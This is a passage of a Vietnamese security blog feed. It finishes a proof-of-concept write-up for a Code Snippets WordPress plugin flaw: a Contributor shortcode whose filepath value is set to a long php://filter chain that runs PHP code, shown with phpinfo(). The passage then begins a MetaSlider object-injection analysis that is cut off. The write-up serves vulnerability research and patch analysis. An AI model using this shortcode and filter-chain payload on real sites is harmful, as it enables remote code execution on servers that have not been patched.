href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ol&gt;&#xA;&lt;li&gt;Administrator b·∫≠t option &lt;code&gt;Enable file-based execution&lt;/code&gt;&lt;/li&gt;&#xA;&lt;li&gt;Contributor ch√®n shortcode sau v√†o post v·ªõi &lt;code&gt;snippet_id&lt;/code&gt; tr·ªè ƒë·∫øn Snippet c√≥ Snippet Type l√† HTML(&lt;code&gt;content&lt;/code&gt;)&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;[code_snippet snippet_id=4 php=1 filepath=/path/to/file]&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;·ªû ƒë√¢y attacker c√≥ to√†n quy·ªÅn ƒëi·ªÅu khi·ªÉn gi√° tr·ªã c·ªßa bi·∫øn &lt;code&gt;filepath&lt;/code&gt;. ƒêi·ªÅu ƒë√≥ cho ph√©p s·ª≠ d·ª•ng c√°c PHP stream wrappers (ch·∫≥ng h·∫°n filter chain) ƒë·ªÉ d·∫´n t·ªõi th·ª±c thi m√£, v√¨:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;require_once&lt;/code&gt; ch·ªâ ki·ªÉm tra xem chu·ªói nh·∫≠n v√†o c√≥ ph·∫£i l√† m·ªôt ƒë∆∞·ªùng d·∫´n h·ª£p l·ªá theo PHP hay kh√¥ng; n√≥ s·∫Ω c·ªë g·∫Øng n·∫°p &lt;strong&gt;b·∫•t k·ª≥&lt;/strong&gt; stream n√†o ƒë∆∞·ª£c cung c·∫•p m√† kh√¥ng gi·ªõi h·∫°n ·ªü file v·∫≠t l√Ω.&lt;/li&gt;&#xA;&lt;li&gt;PHP filter chain cho ph√©p bi·∫øn ƒë·ªïi n·ªôi dung stream v√† khi·∫øn PHP di·ªÖn gi·∫£i k·∫øt qu·∫£ cu·ªëi c√πng nh∆∞ m√£ PHP h·ª£p l·ªá. Khi n·ªôi dung sau filter ƒë∆∞·ª£c ƒë∆∞a v√†o &lt;code&gt;require_once&lt;/code&gt;, PHP s·∫Ω th·ª±c thi n√≥.&lt;/li&gt;&#xA;&lt;li&gt;Nhi·ªÅu wrapper nh∆∞ &lt;code&gt;http://&lt;/code&gt; ho·∫∑c &lt;code&gt;ftp://&lt;/code&gt; b·ªã h·∫°n ch·∫ø b·ªüi c·∫•u h√¨nh m·∫∑c ƒë·ªãnh &lt;code&gt;allow_url_include&lt;/code&gt;, nh∆∞ng c√°c wrapper n·ªôi b·ªô nh∆∞ &lt;code&gt;php://filter&lt;/code&gt; kh√¥ng b·ªã ·∫£nh h∆∞·ªüng b·ªüi gi·ªõi h·∫°n n√†y.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;div class=&#34;details admonition info open disabled&#34;&gt;&#xA;  &lt;div class=&#34;details-summary admonition-title&#34;&gt;&lt;i class=&#34;icon fa-fw fa-solid fa-circle-info&#34; aria-hidden=&#34;true&#34;&gt;&lt;/i&gt;Th√¥ng tin&lt;/div&gt;&#xA;  &lt;div class=&#34;details-content&#34;&gt;&#xA;    &lt;div class=&#34;admonition-content&#34;&gt;&lt;p&gt;&lt;strong&gt;Filter chain&lt;/strong&gt; trong PHP l√† c∆° ch·∫ø cho ph√©p b·∫°n n·ªëi nhi·ªÅu b·ªô l·ªçc (stream filters) l·∫°i v·ªõi nhau ƒë·ªÉ x·ª≠ l√Ω d·ªØ li·ªáu khi ƒë·ªçc ho·∫∑c ghi t·ª´ m·ªôt file/stream. N√≥ ho·∫°t ƒë·ªông d·ª±a tr√™n wrapper ƒë·∫∑c bi·ªát: &lt;code&gt;php://filter&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;K·ªπ thu·∫≠t n√†y ƒë∆∞·ª£c s·ª≠ d·ª•ng trong c√°c cu·ªôc thi CTF, d·ª±a tr√™n nguy√™n l√Ω sau:&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;php://filter&lt;/code&gt;: cho ph√©p g·∫Øn filter v√†o m·ªôt stream (·ªü ƒë√¢y l√† &lt;code&gt;php://temp&lt;/code&gt;).&lt;/li&gt;&#xA;&lt;li&gt;Chu·ªói filter: c√°c filter ƒë∆∞·ª£c n·ªëi b·∫±ng k√Ω t·ª± &lt;code&gt;|&lt;/code&gt;. D·ªØ li·ªáu ƒëi qua t·ª´ng filter theo th·ª© t·ª± t·ª´ tr√°i sang ph·∫£i.&lt;/li&gt;&#xA;&lt;li&gt;C√°c filter ch√≠nh trong chu·ªói:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.iconv.&amp;lt;from&amp;gt;&lt;/code&gt;.&lt;code&gt;&amp;lt;to&amp;gt;&lt;/code&gt;: chuy·ªÉn ƒë·ªïi encoding t·ª´ b·ªô m√£ n√†y sang b·ªô m√£ kh√°c.&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;convert.base64-encode&lt;/code&gt; / &lt;code&gt;convert.base64-decode&lt;/code&gt;: m√£ h√≥a ho·∫∑c gi·∫£i m√£ base64.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;p&gt;Khi k·∫øt h·ª£p h√†ng ch·ª•c filter nh∆∞ v·∫≠y, d·ªØ li·ªáu s·∫Ω b·ªã bi·∫øn ƒë·ªïi nhi·ªÅu l·∫ßn: encode ‚Üí ƒë·ªïi encoding ‚Üí decode ‚Üí encode ‚Üí ‚Ä¶ cho ƒë·∫øn cu·ªëi c√πng.&#xA;Tham kh·∫£o: &lt;a href=&#34;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;https://www.synacktiv.com/publications/php-filters-chain-what-is-it-and-how-to-use-it&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;&#xA;  &lt;/div&gt;&#xA;&lt;/div&gt;&lt;p&gt;Ch·∫°y &lt;a href=&#34;https://github.com/synacktiv/php_filter_chain_generator/tree/main&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;script&lt;/a&gt; sau ƒë·ªÉ t·∫°o PHP Filter Chain:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;$ python3 php_filter_chain_generator.py --chain &amp;#39;&amp;lt;?php phpinfo(); ?&amp;gt;  &amp;#39;&#xA;[&amp;#43;] The following gadget chain will generate the following code : &amp;lt;?php phpinfo(); ?&amp;gt;   (base64 value: PD9waHAgcGhwaW5mbygpOyA/PiAg)&#xA;php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.UCS2.UTF-8|convert.iconv.CSISOLATIN6.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSA_T500.UTF-32|convert.iconv.CP857.ISO-2022-JP-3|convert.iconv.ISO2022JP2.CP775|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM891.CSUNICODE|convert.iconv.ISO8859-14.ISO6937|convert.iconv.BIG-FIVE.UCS-4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;G√°n gi√° tr·ªã v·ª´a t·∫°o ƒë∆∞·ª£c cho &lt;code&gt;filepath&lt;/code&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;figure&gt;&lt;a class=&#34;lightgallery&#34; target=&#34;_blank&#34; href=&#34;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#34; title=&#34;K·∫øt qu·∫£&#34; data-thumbnail=&#34;/posts/2025-11-27-cve-2025-13035/result.png&#34; data-sub-html=&#34;&lt;h2&gt;Result&lt;/h2&gt;&lt;p&gt;K·∫øt qu·∫£&lt;/p&gt;&#34;&gt;&lt;img loading=&#34;lazy&#34; src=&#39;http://localhost:1313/posts/2025-11-27-cve-2025-13035/result.png&#39; alt=&#34;Result&#34; height=&#34;862&#34; width=&#34;1494&#34;&gt;&lt;/a&gt;&lt;figcaption class=&#34;image-caption&#34;&gt;K·∫øt qu·∫£&lt;/figcaption&gt;&#xA;  &lt;/figure&gt;&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng trong plugin Code Snippets xu·∫•t ph√°t t·ª´ vi·ªác s·ª≠ d·ª•ng &lt;code&gt;extract()&lt;/code&gt; m√† kh√¥ng c√≥ c∆° ch·∫ø b·∫£o v·ªá, cho ph√©p ghi ƒë√® bi·∫øn n·ªôi b·ªô v√† d·∫´n ƒë·∫øn vi·ªác th·ª±c thi file tu·ª≥ √Ω th√¥ng qua &lt;code&gt;require_once&lt;/code&gt;. Khi k·∫øt h·ª£p v·ªõi t√πy ch·ªçn ‚ÄúEnable file-based execution‚Äù v√† shortcode &lt;code&gt;[code_snippet]&lt;/code&gt;, m·ªôt ng∆∞·ªùi d√πng c√≥ quy·ªÅn Contributor c√≥ th·ªÉ k√≠ch ho·∫°t th·ª±c thi m√£ PHP kh√¥ng mong mu·ªën. B·∫£n v√° ƒë√£ kh·∫Øc ph·ª•c v·∫•n ƒë·ªÅ b·∫±ng c√°ch s·ª≠ d·ª•ng &lt;code&gt;EXTR_SKIP&lt;/code&gt;, ƒë·∫£m b·∫£o c√°c bi·∫øn nh·∫°y c·∫£m kh√¥ng b·ªã ghi ƒë√® trong qu√° tr√¨nh x·ª≠ l√Ω shortcode.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key Takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Vi·ªác s·ª≠ d·ª•ng &lt;code&gt;extract()&lt;/code&gt; m√† kh√¥ng ki·ªÉm so√°t bi·∫øn l√† r·ªßi ro nghi√™m tr·ªçng, ƒë·∫∑c bi·ªát khi d·ªØ li·ªáu ƒë·∫ßu v√†o ƒë·∫øn t·ª´ ng∆∞·ªùi d√πng.&lt;/li&gt;&#xA;&lt;li&gt;PHP stream wrappers, bao g·ªìm filter chains, c√≥ th·ªÉ tr·ªü th√†nh c√¥ng c·ª• m·∫°nh m·∫Ω ƒë·ªÉ chuy·ªÉn ƒë·ªïi d·ªØ li·ªáu th√†nh m√£ th·ª±c thi.&lt;/li&gt;&#xA;&lt;li&gt;M·ªôt t√πy ch·ªçn c·∫•u h√¨nh t∆∞·ªüng ch·ª´ng v√¥ h·∫°i nh∆∞ ‚ÄúEnable file-based execution‚Äù c√≥ th·ªÉ m·ªü r·ªông b·ªÅ m·∫∑t t·∫•n c√¥ng ƒë√°ng k·ªÉ.&lt;/li&gt;&#xA;&lt;li&gt;C√°c shortcode WordPress c·∫ßn ƒë∆∞·ª£c x·ª≠ l√Ω c·∫©n tr·ªçng v√¨ ch√∫ng ƒë∆∞·ª£c Contributor s·ª≠ d·ª•ng trong n·ªôi dung b√†i vi·∫øt.&lt;/li&gt;&#xA;&lt;li&gt;Vi·ªác b·ªï sung &lt;code&gt;EXTR_SKIP&lt;/code&gt; trong b·∫£n v√° cho th·∫•y c√°ch ƒë∆°n gi·∫£n nh∆∞ng hi·ªáu qu·∫£ ƒë·ªÉ gi·∫£m thi·ªÉu nguy c∆° ghi ƒë√® bi·∫øn nh·∫°y c·∫£m.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/academy/wordpress/vulnerabilities/remote-code-execution/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/code-snippets/vulnerability/wordpress-code-snippets-plugin-3-9-1-authenticated-contributor-php-code-injection-via-extract-and-php-filter-chains-vulnerability&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Code Snippets Plugin &amp;lt;= 3.9.1 is vulnerable to Remote Code Execution (RCE)&lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-26763 Analysis &amp; POC</title>
      <link>http://localhost:1313/vi/posts/2025-11-26-cve-2025-26763/</link>
      <pubDate>Wed, 26 Nov 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/vi/posts/2025-11-26-cve-2025-26763/</guid>
      <category domain="http://localhost:1313/vi/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-11-26-cve-2025-26763/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;L·ªó h·ªïng &lt;strong&gt;Deserialization of Untrusted Data&lt;/strong&gt; trong plugin &lt;strong&gt;MetaSlider Responsive Slider&lt;/strong&gt; c·ªßa MetaSlider cho ph√©p &lt;strong&gt;Object Injection&lt;/strong&gt;. V·∫•n ƒë·ªÅ n√†y ·∫£nh h∆∞·ªüng ƒë·∫øn &lt;strong&gt;Responsive Slider by MetaSlider&lt;/strong&gt; t·ª´ phi√™n b·∫£n ch∆∞a x√°c ƒë·ªãnh ƒë·∫øn &lt;strong&gt;3.94.0&lt;/strong&gt;.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-26763&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-26763&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: PHP Object Injection&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 3.94.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 3.95.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Medium (9.8)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Editor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/ml-slider/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Responsive Slider by MetaSlider Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Virtual Machine&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;a href=&#34;https://w41bu1.github.io/posts/2025-10-22-wordpress-local-and-debugging-docker/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Docker&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin Version&lt;/strong&gt; - &lt;strong&gt;Responsive Slider by MetaSlider&lt;/strong&gt;:&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;code&gt;3.94.0&lt;/code&gt; ‚Äì &lt;strong&gt;vulnerable&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;code&gt;3.95.0&lt;/code&gt; ‚Äì &lt;strong&gt;patched&lt;/strong&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff Tool (diff)&lt;/strong&gt; ‚Üí &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; ho·∫∑c b·∫•t k·ª≥ c√¥ng c·ª• diff n√†o.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;cause&#34;&gt;&lt;span&gt;Cause&lt;/span&gt;&#xA;  &lt;a href=&#34;#cause&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 